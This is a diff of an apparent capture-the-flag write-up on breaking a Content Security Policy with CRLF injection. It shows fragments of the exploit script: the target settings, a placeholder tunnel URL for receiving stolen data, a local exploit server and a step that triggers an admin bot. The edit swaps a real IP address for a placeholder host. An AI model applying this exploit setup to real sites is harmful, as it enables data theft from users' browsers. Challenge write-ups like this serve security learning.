@@ -6,7 +6,6 @@ tags:
 
 # Bookmarks - Breaking CSP with CRLF
 
-**Category:** Web Exploitation
 **Flag:** `FLAG{...}`
 
 ## The Challenge
@@ -131,7 +130,7 @@ import time
 import random
 import string
 
-TARGET_URL = "http://65.109.202.184"
+TARGET_URL = "http://challenge.local"
 INTERNAL_ORIGIN = "http://web"
 TUNNEL_URL = "https://your-tunnel.trycloudflare.com"
 
@@ -156,7 +155,7 @@ def main():
 
     # Step 3: Start exploit server
     print("[3] Starting server...")
-    server = socketserver.TCPServer(("0.0.0.0", 8000), Handler)
+    server = socketserver.TCPServer(("localhost", 8000), Handler)
     threading.Thread(target=server.serve_forever, daemon=True).start()
 
     # Step 4: Trigger bot
